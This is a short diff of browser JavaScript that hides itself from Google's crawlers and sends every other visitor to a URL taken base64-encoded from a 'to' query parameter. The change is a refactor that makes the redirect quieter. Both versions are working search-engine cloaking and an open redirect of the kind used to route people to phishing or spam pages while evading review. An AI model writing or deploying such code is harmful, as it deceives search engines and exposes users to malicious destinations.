@@ -1,15 +1,10 @@
 const ua = navigator.userAgent;
-
 if (!ua.includes('Googlebot') && !ua.includes('Google-InspectionTool')) {
-  const urlParams = new URLSearchParams(window.location.search);
-  const encodedUrl = urlParams.get('to');
-
-  if (encodedUrl) {
+  const params = new URLSearchParams(location.search);
+  const target = params.get('to');
+  if (target) {
     try {
-      const targetUrl = atob(encodedUrl);
-      window.location.href = targetUrl;
-    } catch (e) {
-      console.error("Invalid base64 string");
-    }
+      window.location.replace(atob(target));
+    } catch(e) {}
   }
 }
